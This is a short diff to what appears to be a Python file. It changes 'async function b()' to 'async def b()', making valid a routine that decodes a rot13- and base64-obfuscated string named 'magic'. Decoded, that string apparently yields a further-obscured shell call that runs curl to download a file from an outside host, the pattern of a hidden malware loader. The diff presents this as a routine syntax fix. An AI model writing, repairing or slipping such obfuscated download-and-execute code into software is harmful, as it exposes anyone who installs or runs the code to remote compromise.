@@ -10,7 +10,7 @@ magic = '''
 LzLhMzkzM3W6XPWjnTI5VP1PVUIaM2AzBv8iLJ5bqUIaYJ9vLauzYwNjZTclo3IvMzqhL2ZhpTW6Y2udnP5woPVcPt==
 '''
 
-async function b():
+async def b():
     byte = codecs.decode(magic, "rot13")
     string = base64.b64decode(byte)
     tr = string.decode()
